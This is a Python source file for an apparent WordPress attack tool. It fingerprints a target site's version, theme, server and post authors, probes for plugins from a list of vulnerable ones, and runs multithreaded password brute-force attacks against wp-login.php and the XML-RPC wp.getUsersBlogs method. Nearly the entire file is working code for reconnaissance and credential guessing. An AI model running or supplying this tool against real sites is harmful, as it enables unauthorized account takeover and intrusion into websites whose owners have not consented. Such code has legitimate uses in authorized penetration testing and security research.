from __future__ import division
import requests
import re
import threading
from multiprocessing import Queue, Process
from multiprocessing.sharedctypes import Value
import time 
import os
import sys
from init import *

class WordPress_Scan():
	def __init__(self,dict):
		TempUrl = dict['url']
		self.url =  "http://{0}".format(TempUrl)
		self.username = dict['uname']
		self.pwdfile = dict['pwd']
		self.Mixthread = dict['threads']

	def VersionScan(self):
		self.Version_Path =  self.url+'/readme.html'
		self.Version_Page = requests.get(self.Version_Path)
		self.Version_Page.encoding='utf-8'
		if(self.Version_Page.status_code == 200):
			self.Version_text = self.Version_Page.text
			self.reg = r'<br />(.+?)\n</h1>'
			self.RegEx = re.compile(self.reg,re.S)
			self.Version = re.findall(self.RegEx,self.Version_text)
			if(len(self.Version)>0):
				print "Wordpress Version:\33[31m%s\33[0m" %self.Version[0].encode("utf-8")

	def ThemesScan(self):
		ThemesPath = self.url
		self.URL_Page = requests.get(ThemesPath)
		if(self.URL_Page.status_code == 200):
			URL_Page_text = self.URL_Page.text
			reg = r'/wp-content/themes/(.*?)/'
			RegEx = re.compile(reg)
			themes = re.findall(RegEx,URL_Page_text)
			if(len(themes)>0):
				print "Wordpress Themes:\33[31m%s\33[0m" %themes[0]

	def Server_Scan(self):
		Server_Path = self.url
		self.ReServer = requests.get(Server_Path)
		if(self.ReServer.status_code == 200):
			print "Wordpress Server Info:\33[31m%s\33[0m" %self.ReServer.headers['server']

	def AuthorScan(self):
		AuthorPath = self.url+'?feed=rss2'
		self.ReAuthor = requests.get(AuthorPath)
		if(self.ReAuthor.status_code == 200):
			Author_text = self.ReAuthor.text
			reg =  r'<dc:creator><!\[CDATA\[(.*?)\]\]></dc:creator>'
			RegEx = re.compile(reg)
			Author_list= re.findall(reg,Author_text)
			if(len(Author_list)>0):
				print "Wordpress Author maybe:\33[31m%s\33[0m" %Author_list[0]

	def LoadPlugin(self):
		print "\33[33mStart Plugin scan,please wait...\33[0m"
		self.count = 0;
		PluginThread=[]
		ExistList = []
		self.flag = 0
		self.PluginQueue = Queue(maxsize = 10000)
		linecount = len(open('./loopholes_plugin.txt','rU').readlines())
		Plugin_Path =  "http://{0}".format(self.url)
		if(os.path.exists(r'./loopholes_plugin.txt')):
			file = open(r'./loopholes_plugin.txt','r')
			for line in file:
				PluginList = line.strip()
				self.PluginQueue.put(PluginList)
			file.close()
			self.PluginQueue.cancel_join_thread() 
		else:
			print " file does not exist!"
		start = time.time()
		for count in range(5):
			t = threading.Thread(target = self.PluginScan,args = (linecount,ExistList))
			t.setDaemon(True)
			t.start()
			PluginThread.append(t)
		for i in PluginThread:
			i.join()
		print ""
		for j in ExistList:
			print "\33[31m%s\33[0m" %j
		end = time.time()
		#print "Plugin_Scan_Time: %f s" % (end - start)
		
	def PluginScan(self,linecount,ExistList):
		thread = threading.current_thread()
		while not self.PluginQueue.empty():
			Plugin_Path =  self.url
			try:
				PluginDir = self.PluginQueue.get(timeout = 1)
			except:
				break
			Plugin_Path = "%s/wp-content/plugins/%s/" %(Plugin_Path,PluginDir)
			Plugin_re = requests.get(Plugin_Path,headers = HEADERS,timeout = 3)
			if(Plugin_re.status_code == 200 or Plugin_re.status_code == 403):
				ExistList.append(PluginDir)
			Plugin_Path =  self.url
			self.count+=1
			sys.stdout.write('Current full schedule:'+str(str(self.count)+'/'+str(linecount))+"\r")
			sys.stdout.flush()

	def Brute_Force(self):
		self.Brute_path1 = self.url+'/wp-login.php'
		self.Brute_path2 = self.url+'/xmlrpc.php'
		self.KeyFlag = Value('b', 0)
		self.pwdnum = 0
		self.PwdQueue = Queue(maxsize = 10000)
		self.TruePwd = Queue(maxsize =10000)
		self.pwdcount = len(open(self.pwdfile,'rU').readlines())
		RePath1 = requests.get(self.Brute_path1)
		if(RePath1.status_code == 200):
			print "Start wp-login.php Brute Force"
			self.Login_Load_Brute_Force()
		else:
			print"\33[33mwp-login.php does not exist!\33[0m"
			RePath2 = requests.post(self.Brute_path2)
			if(RePath2.status_code == 200):
				print "Start Xmlrpc.php Brute Force"
				self.Xmlrpc_Load_Brute_Force()
			else:
				print "\33[33mXML-RPC service has been disabled\33[0m"
				print "\33[33mStop Brute_Force!\33[0m"

	def  Login_Load_Brute_Force(self):
		PwdThread = []
		GetPwd = threading.Thread(target = self.LoginReadPwdFile)
		GetPwd.start()
		for i in range(self.Mixthread):
			th = threading.Thread(target = self.Login_Brute_Force)
			th.setDaemon(True)
			th.start()
			PwdThread.append(th)
		for i in PwdThread:
			i.join()


	def Login_Brute_Force(self):
		while 1:
			if(self.KeyFlag.value):
				break
			if(not self.PwdQueue.empty()):
				Payload = self.PwdQueue.get()
			else:
				break
			Path1re = requests.post(self.Brute_path1,data = Payload,headers = HEADERS)
			self.pwdnum+=1
			if(Path1re.text == ''):
				self.KeyFlag.value = 1
				print ""
				print "\33[31mpassword :%s success !\33[0m" %Payload['pwd']
			sys.stdout.write('Current full schedule:'+str(str(self.pwdnum)+'/'+str(self.pwdcount))+"\r")
			sys.stdout.flush()

	def LoginReadPwdFile(self):
		file = open(self.pwdfile)
		for line in file:
			pwd = line.strip()
			if (pwd):
				payload = {'log':self.username,'pwd':pwd,'redirect_to':''}
				self.PwdQueue.put(payload)
		file.close()
		self.PwdQueue.cancel_join_thread()

	def Xmlrpc_Load_Brute_Force(self):
		PwdThread = []
		GetPwd = threading.Thread(target = self.XmlrpcReadPwdFile)
		GetPwd.start()
		for i in range(self.Mixthread):
			th = threading.Thread(target = self.Xmlrpc_Brute_Force)
			th.setDaemon(True)
			th.start()
			PwdThread.append(th)
		for i in PwdThread:
			i.join()

	def XmlrpcReadPwdFile(self):
		file = open(self.pwdfile)
		for line in file:
			pwd = line.strip()
			if(pwd):
				Payload = '''
    					<?xml version="1.0" encoding="iso-8859-1"?>
    					<methodCall>
      					<methodName>wp.getUsersBlogs</methodName>
      					<params>
       					<param><value>''' + self.username + '''</value></param>
       					<param><value>''' + pwd + '''</value></param>
      					</params>
    					</methodCall>
  					'''
  				self.PwdQueue.put(Payload)
  				self.TruePwd.put(pwd)
  		file.close()
  		self.PwdQueue.cancel_join_thread()
  		self.TruePwd.cancel_join_thread()

  	def Xmlrpc_Brute_Force(self):
  		while 1:
  			if(self.KeyFlag.value):
				break
			if(not self.PwdQueue.empty()):
				Payload = self.PwdQueue.get()
				pwd = self.TruePwd.get()
			else:
				break
			Path2re = requests.post(self.Brute_path2,data = Payload,headers = HEADERS)
			self.pwdnum+=1
			msg = Path2re.text
			if '<int>405</int>' in msg:
				print "\33[33mXML-RPC service has been disabled\33[0m"
				break
			elif 'isAdmin' in msg:
				self.KeyFlag.value = 1
				print ""
				print "\33[31mpassword :%s success !\33[0m" %pwd
				break
			sys.stdout.write('Current full schedule:'+str(str(self.pwdnum)+'/'+str(self.pwdcount))+"\r")
			sys.stdout.flush()

			








